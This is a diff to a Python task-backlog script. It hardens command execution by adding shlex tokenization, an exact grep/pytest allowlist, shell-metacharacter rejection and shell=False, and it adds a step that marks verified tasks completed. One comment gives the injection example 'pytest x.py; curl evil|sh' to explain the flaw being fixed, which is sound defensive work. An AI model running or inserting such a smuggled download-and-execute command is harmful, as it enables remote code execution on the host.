@@ -44,6 +44,7 @@ import datetime
 import json
 import os
 import re
+import shlex
 import shutil
 import subprocess
 import sys
@@ -209,8 +210,49 @@ def wiring_registry_matches(cur, title, limit=5):
 
 
 _BACKTICK_CMD_RE = re.compile(r'`([^`]+)`')
-_RUNNABLE_CMD_PREFIXES = ("python3 -m pytest", "pytest ", "grep ")
 _CHECKOUT_CACHE = {}
+
+# Real allowlist for verify_success_criteria()'s command execution -- exact
+# program/subcommand identity, not a prefix/substring check. A prefix check
+# like `cmd.startswith('pytest ')` still matches `pytest x.py; curl evil|sh`;
+# this instead validates the fully-tokenized argv.
+_SHELL_METACHAR_RE = re.compile(r'[;&`$<>(){}\n\r]')
+_UNESCAPED_PIPE_RE = re.compile(r'(?<!\\)\|')
+
+
+def _token_has_shell_metachar(token):
+    return bool(_SHELL_METACHAR_RE.search(token) or _UNESCAPED_PIPE_RE.search(token))
+
+
+def _is_allowlisted_argv(argv):
+    if not argv:
+        return False
+    prog = argv[0]
+    if prog in ("grep", "pytest"):
+        return True
+    if prog == "python3" and len(argv) >= 3 and argv[1] == "-m" and argv[2] == "pytest":
+        return True
+    return False
+
+
+def tokenize_and_validate_command(cmd):
+    """Tokenize a SUCCESS_CRITERIA-extracted command string (shlex, so quoted
+    args stay intact) and validate it against a real allowlist before it is
+    ever handed to subprocess.run with shell=False. Returns the argv list if
+    safe to run, else None -- never raises past this boundary. A command is
+    rejected outright if any token still carries a bare (unescaped) shell
+    metacharacter after tokenization (e.g. a stray `;` or `|` from a smuggled
+    second command), or if argv[0] (and, for python3, argv[1:3]) is not
+    exactly `grep`, `pytest`, or `python3 -m pytest`."""
+    try:
+        argv = shlex.split(cmd)
+    except ValueError:
+        return None
+    if any(_token_has_shell_metachar(tok) for tok in argv):
+        return None
+    if not _is_allowlisted_argv(argv):
+        return None
+    return argv
 
 
 def find_group_original(group):
@@ -242,8 +284,9 @@ def extract_verifiable_commands(success_criteria_text):
     section -- this project's dispatch prompts already write SUCCESS_CRITERIA
     in exactly this style (see task-20260726-083946's prompt.txt). A bullet
     with no backtick command, or backticks around something that isn't a
-    pytest/grep call, cannot be mechanically run and is intentionally
-    excluded rather than guessed at."""
+    real, safely-tokenizable pytest/grep call per tokenize_and_validate_command's
+    allowlist, cannot be mechanically run and is intentionally excluded rather
+    than guessed at."""
     if not success_criteria_text:
         return []
     commands = []
@@ -253,7 +296,7 @@ def extract_verifiable_commands(success_criteria_text):
             continue
         for m in _BACKTICK_CMD_RE.finditer(line):
             cmd = m.group(1).strip()
-            if cmd.startswith(_RUNNABLE_CMD_PREFIXES):
+            if tokenize_and_validate_command(cmd) is not None:
                 commands.append(cmd)
     return commands
 
@@ -289,10 +332,12 @@ def cleanup_checkouts():
 def verify_success_criteria(repo, commands):
     """Actually run the original task's own mechanically-runnable
     SUCCESS_CRITERIA commands against a fresh checkout of the real current
-    default branch (not the group's own checkpoint prose). Commands are
-    restricted at extraction time (extract_verifiable_commands) to a
-    pytest/grep safelist authored by this project's own trusted dispatch
-    prompts -- not arbitrary/external input. Returns (all_passed, details)."""
+    default branch (not the group's own checkpoint prose). Every command is
+    re-tokenized and re-validated here (tokenize_and_validate_command) against
+    a real allowlist -- not trusted merely because it already passed
+    extract_verifiable_commands's filter -- and executed as a real argv list
+    with no shell involved at all, so nothing ever interprets `;`, `|`,
+    `` ` ``, `$()`, or redirects in this text. Returns (all_passed, details)."""
     if not commands:
         return False, []
     checkout = get_repo_checkout(repo)
@@ -303,8 +348,15 @@ def verify_success_criteria(repo, commands):
     ).stdout.strip()
     details = []
     for cmd in commands:
+        argv = tokenize_and_validate_command(cmd)
+        if argv is None:
+            details.append({
+                "command": cmd, "passed": False, "checked_commit": head,
+                "error": "rejected: command failed allowlist/shell-metacharacter validation, not executed",
+            })
+            continue
         try:
-            run = subprocess.run(cmd, shell=True, cwd=checkout, capture_output=True, text=True, timeout=180)
+            run = subprocess.run(argv, shell=False, cwd=checkout, capture_output=True, text=True, timeout=180)
             passed = run.returncode == 0
             details.append({
                 "command": cmd, "passed": passed, "checked_commit": head,
@@ -480,6 +532,67 @@ def apply_collapse(task_id, duplicate_of, category, evidence, dry_run=True):
         with open(yaml_path, "w") as f:
             yaml.safe_dump(d, f, sort_keys=False)
     return d
+
+
+def apply_representative_completion(task_id, evidence, dry_run=True):
+    """Companion to apply_collapse(): patches the REPRESENTATIVE/original
+    task's own task.yaml status to 'completed'. classify()'s own
+    ALREADY_DONE_STALE_STATUS action text promises "...patch task.yaml status
+    to completed, no redispatch" -- apply_collapse() alone only ever wrote the
+    OTHER (non-representative) attempts to status=superseded, so a correct
+    --apply run left the real representative task stuck in its original
+    blocked/failed status forever and the backlog's raw-incomplete count
+    never actually shrank for this category. Refuses a missing/empty
+    evidence string, same as apply_collapse()."""
+    if not evidence or not evidence.strip():
+        raise ValueError(f"refuse to complete {task_id}: no cited verification evidence given.")
+    yaml_path = os.path.join(TASKS_DIR, task_id, "task.yaml")
+    with open(yaml_path) as f:
+        d = yaml.safe_load(f) or {}
+    d["status"] = "completed"
+    d["completion_reason"] = (
+        f"Marked completed by plan_backlog_completion.py --apply on {datetime.date.today().isoformat()} -- {evidence}"
+    )
+    if not dry_run:
+        with open(yaml_path, "w") as f:
+            yaml.safe_dump(d, f, sort_keys=False)
+    return d
+
+
+def apply_verified_collapses(issues, apply_only_issue_key=None, dry_run=True):
+    """The --apply driver, factored out of main() so it is directly testable:
+    for every issue this run classified ALREADY_DONE_STALE_STATUS with a
+    passing SUCCESS_CRITERIA re-verification, marks every non-representative
+    attempt superseded (apply_collapse) AND patches the representative task's
+    own status to 'completed' (apply_representative_completion) -- the full
+    action classify() promises, not just the duplicate-marking half of it.
+    Returns the number of real task.yaml writes performed."""
+    applied_count = 0
+    for issue in issues:
+        c = issue["classification"]
+        if c.get("category") != "ALREADY_DONE_STALE_STATUS":
+            continue
+        verification = c.get("success_criteria_verification") or {}
+        if not verification.get("verified"):
+            continue
+        if apply_only_issue_key and issue["issue_key"] not in apply_only_issue_key:
+            continue
+        details = verification.get("details") or []
+        checked_commit = details[0].get("checked_commit") if details else "unknown"
+        evidence = (
+            f"PR #{c.get('pr_number')} merged; original task `{verification.get('original_task_id')}`'s "
+            f"SUCCESS_CRITERIA ({len(verification.get('commands') or [])} command(s)) independently "
+            f"re-run and passing at commit {checked_commit}."
+        )
+        rep_id = issue["representative_task_id"]
+        for attempt_id in issue["all_attempt_ids"]:
+            if attempt_id == rep_id:
+                continue
+            apply_collapse(attempt_id, rep_id, c["category"], evidence, dry_run=dry_run)
+            applied_count += 1
+        apply_representative_completion(rep_id, evidence, dry_run=dry_run)
+        applied_count += 1
+    return applied_count
 
 
 def run_audit_report(out_path, db_cur):
@@ -690,29 +803,10 @@ def main():
 
     applied_count = 0
     if args.apply:
-        for issue in issues:
-            c = issue["classification"]
-            if c.get("category") != "ALREADY_DONE_STALE_STATUS":
-                continue
-            verification = c.get("success_criteria_verification") or {}
-            if not verification.get("verified"):
-                continue
-            if args.apply_only_issue_key and issue["issue_key"] not in args.apply_only_issue_key:
-                continue
-            details = verification.get("details") or []
-            checked_commit = details[0].get("checked_commit") if details else "unknown"
-            evidence = (
-                f"PR #{c.get('pr_number')} merged; original task `{verification.get('original_task_id')}`'s "
-                f"SUCCESS_CRITERIA ({len(verification.get('commands') or [])} command(s)) independently "
-                f"re-run and passing at commit {checked_commit}."
-            )
-            rep_id = issue["representative_task_id"]
-            for attempt_id in issue["all_attempt_ids"]:
-                if attempt_id == rep_id:
-                    continue
-                apply_collapse(attempt_id, rep_id, c["category"], evidence, dry_run=False)
-                applied_count += 1
-        print(f"--apply: wrote real collapse to {applied_count} task.yaml file(s).", file=sys.stderr)
+        applied_count = apply_verified_collapses(
+            issues, apply_only_issue_key=args.apply_only_issue_key, dry_run=False
+        )
+        print(f"--apply: wrote real collapse/completion to {applied_count} task.yaml file(s).", file=sys.stderr)
 
     cleanup_checkouts()
     print(json.dumps(summary, indent=2))
